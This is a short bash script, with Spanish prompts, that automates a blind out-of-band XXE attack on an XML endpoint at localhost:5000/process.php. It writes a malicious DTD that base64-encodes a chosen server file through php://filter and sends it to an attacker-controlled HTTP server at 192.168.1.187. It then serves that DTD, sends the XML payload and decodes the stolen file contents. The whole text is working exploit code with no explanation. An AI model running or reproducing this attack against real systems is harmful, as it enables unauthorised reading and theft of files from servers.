#!/bin/bash

echo -ne "[+] Introduce el archivo a leer: " && read -r myFileName

malicius_dtd="""
<!ENTITY % file SYSTEM \"php://filter/convert.base64-encode/resource=$myFileName\">
<!ENTITY % eval \"<!ENTITY &#x25; exfil SYSTEM 'http://192.168.1.187/?file=%file;'>\">
%eval;
%exfil;"""

echo $malicius_dtd > malicius.dtd

python3 -m http.server 80 &>response &

PID=$!

sleep 1; echo

curl -s -X POST "http://localhost:5000/process.php" \
     -H "Content-Type: application/xml" \
     --data-binary '<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://192.168.1.187/malicius.dtd"> %xxe;]><root><name>test</name><tel>123456789</tel><email>test@test.com</email><password>test1234</password></root>'

DATA=$(cat response | grep --color=never -oP 'file=\K[^ ]+')
echo "$DATA" | base64 -d; echo

kill -9 $PID
wait $PID 2>/dev/null

rm response 2>/dev/null

#echo; echo $malicius_dtd
